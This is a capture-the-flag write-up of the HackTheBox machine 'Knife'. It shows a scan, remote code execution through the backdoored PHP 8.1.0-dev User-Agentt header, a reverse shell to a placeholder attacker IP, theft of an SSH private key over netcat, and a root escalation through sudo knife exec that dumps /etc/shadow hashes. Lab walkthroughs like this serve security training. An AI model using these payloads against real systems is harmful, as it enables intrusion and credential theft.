# Enumeration
## PORT
|Port|Service|Version|
|----|----|----|
|22|SSH|Openssh 8.2p1|
|80|HTTP|Apache httpd 2.4.41|
## NMAP
```bash
# Nmap 7.91 scan initiated Sun May 23 01:14:04 2021 as: nmap -A -v -T4 -oN intial.nmap 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/23%OT=22%CT=1%CU=36992%PV=Y%DS=2%DC=T%G=Y%TM=60A9AC7
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 37.562 days (since Thu Apr 15 11:45:44 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   118.25 ms 10.10.14.1
2   117.19 ms 10.10.10.242

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 23 01:14:37 2021 -- 1 IP address (1 host up) scanned in 34.30 seconds
```
From nmap result one thing caught my and that is it an apache httpd server instead of regular nginx in all the HackTheBox Machine.
As the latest release for apache httpd is 2.4.46 there could be a known vuln in 2.4.41 so I looked for it on web.
Looking for it I stumbled around this Rapid7 Post https://www.rapid7.com/db/vulnerabilities/apache-httpd-cve-2020-1934/.
But there is one concerning thing about this exploit you need to have mod\_proxy\_ftp
module running and have FTP backend which we know nothing of.
## Web-Visting
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Knife%20(HTB)/Pasted%20image%2020210523071829.png)

We can find this static page and nothing intresting in it. 

![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Knife%20(HTB)/Pasted%20image%2020210523072056.png)

looking the source code found pen.js which looked intresting but after looking at it got nothing intresting.
Also added knife.htb in /etc/hosts to look for sub-domain but interestingly we found the default nginx page.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Knife%20(HTB)/Pasted%20image%2020210523072307.png)
This was intresting.
But let's go back to your main page.
Looking for vulns I found one intresting thing that php 8.1.x-dev was backdoored by some hackers.
You can find articles on it.
https://techbeacon.com/security/php-backdoored-git-hack-its-no-joke-so-dont-be-fool
https://www.welivesecurity.com/2021/03/30/backdoor-php-source-code-git-server-breach/
This is intresting as server is leaking the the version of PHP.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Knife%20(HTB)/Pasted%20image%2020210523074259.png)
Wappalyzer detected it.
Looking through bunch of article finally came up to this one where it showed how to exploit this backdoored by some troll hackers.
https://blog.csdn.net/zy15667076526/article/details/116447864
The website is originally in chinese but the google translate works fine.
So let's see if your PHP is dev version or not.
```bash
kali@kali:~/HackTheBox/Knife$ curl -i http://10.10.10.242/
HTTP/1.1 200 OK
Date: Sun, 23 May 2021 02:31:24 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```
Looking at X-Powered-By header we can say that indeed we are in luck and the version is PHP/8.1.0-dev.
# Exploitation
Reading throught the article found out that the backdoor can be accessed using User-Agentt Header to execute the code.
We have to append the string zerodium which is also one of the leading zero day vuln finder firm.
so let's try PoC for this exploit.
```bash
kali@kali:~/HackTheBox/Knife$ curl -i -s -k -H 'User-Agentt: zerodiumvar_dump(2*3);' http://10.10.10.242/
HTTP/1.1 200 OK
Date: Sun, 23 May 2021 02:28:48 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

int(6)   
```
Looks like we triggered the RCE let's get going and get try to excute system commands.
```bash
kali@kali:~/HackTheBox/Knife$ curl -i -s -k -H 'User-Agentt: zerodiumsystem("id");' http://10.10.10.242
HTTP/1.1 200 OK
Date: Sun, 23 May 2021 02:34:09 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

uid=1000(james) gid=1000(james) groups=1000(james)
```
Looks like the web server is running as james so one less step for us.
Let's get the REV-Shell.
```bash
kali@kali:~/HackTheBox/Knife$ curl -i -s -k -H $'User-Agentt: zerodiumsystem(\"bash -c \'bash -i >& /dev/tcp/<YOUR IP>/<PORT> 0>&1\'\");' http://10.10.10.242
```
And boom we have the shell
```bash
kali@kali:~/HackTheBox/Knife$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [<YOUR IP>] from (UNKNOWN) [10.10.10.242] 60452
bash: cannot set terminal process group (966): Inappropriate ioctl for device
bash: no job control in this shell
id
id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:/$ 
```
# PrivESC
## SSH Access
Before PrivESC let's just get the stable shell looking into users .ssh we found the key id_rsa
```bash
cd .ssh
cp id_rsa.pub authorized_keys
nc <YOUR IP> <PORT> < id_rsa
```
and then in your shell 
```bash
kali@kali:~/HackTheBox/Knife$ nc -nlvp 12345 > id_rsa
listening on [any] 12345 ...
connect to [YOUR IP] from (UNKNOWN) [10.10.10.242] 37114
kali@kali:~/HackTheBox/Knife$ chmod 700 id_rsa 
kali@kali:~/HackTheBox/Knife$ ssh -i id_rsa james@10.10.10.242
The authenticity of host '10.10.10.242 (10.10.10.242)' can't be established.
ECDSA key fingerprint is SHA256:b8jYX4F9OUtvZffH50q3L3B4hrSL/TxxPuue0hlbvRU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.242' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 23 May 2021 02:48:14 AM UTC

  System load:             0.16
  Usage of /:              52.5% of 9.72GB
  Memory usage:            61%
  Swap usage:              0%
  Processes:               342
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.242
  IPv6 address for ens160: dead:beef::250:56ff:feb9:fc3a


18 updates can be applied immediately.
13 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


james@knife:~$ cat user.txt
cat user.txt
517f87db67259fe18b6d86b4eaa0ba8d
```
Now we have the stable shell now lets enumerate for PrivESC.
## Enumeration
```bash
james@knife:~$ cat ex.rb 
puts File.read('/etc/shadow')
```
Looking into user's home directory we can see an intresting ruby file which can read /etc/shadow but the catch is we dont have ruby on the box or atleast on the desired path and the desired name.
### sudo -l
```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Analysing the file /usr/bin/knife
```bash
james@knife:~$ file /usr/bin/knife 
/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife
```
It's symbolic link to another file /opt/chef-workstation/bin/knife.
looking at the directory /opt/chef-workstation we can see it a ruby installation.
```bash
james@knife:~$ ls /opt/chef-workstation/
bin  components  embedded  gem-version-manifest.json  gitbin  LICENSE  LICENSES  version-manifest.json  version-manifest.txt
```
so basically on this box ruby commands can be run using /usr/bin/knife.
running /usr/bin/knife we get the big help menu.
```bash
james@knife:~$ sudo /usr/bin/knife
<-----SNIP------>
** EXEC COMMANDS **
knife exec [SCRIPT] (options)
```
Now let's run our ex.rb script
```bash
james@knife:~$ sudo /usr/bin/knife exec ex.rb

root:$6$LCKz7Uz/FuWPPJ6o$LaOquetpLJIhOzr7YwJzFPX4NdDDHokHtUz.k4S1.CY7D/ECYVfP4Q5eS43/PMtsOa5up1ThgjB3.xUZsHyHA1:18754:0:99999:7:::
daemon:*:18659:0:99999:7::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18753:0:99999:7:::
sshd:*:18753:0:99999:7:::
systemd-coredump:!!:18753::::::
james:$6$S4BgtW0nZi/8w.C0$pREFaCmQmAue0cm6eTgvF.vFdhsIdTr5q6PdrMVNCw4hc7TmlSqAcgMz0yOBG7mT6GcoH9gGbo.zLLG/VeT31/:18754:0:99999:7:::
lxd:!:18753::::::
opscode:!:18754::::::
opscode-pgsql:!:18754::::::
```
Now we can write our own ruby script to run the system commands.
I wrote a simple ruby script to run /bin/bash
```bash
james@knife:~$ echo "system('/bin/bash')" > test.rb
james@knife:~$ cat test.rb 
system('/bin/bash')
james@knife:~$ sudo /usr/bin/knife exec test.rb 
root@knife:/home/james# id
uid=0(root) gid=0(root) groups=0(root)
root@knife:# cat root.txt
920dab819a59d0b6a9a950a816d8617f

```
We are root now so let's get all the flags.

# If you like the writeup please give rep+ ,credits and do share your feedback on this writeup.
Profie Link: [<img src="http://www.hackthebox.eu/badge/image/387509" alt="Hack The Box"/>](https://app.hackthebox.eu/profile/387509)


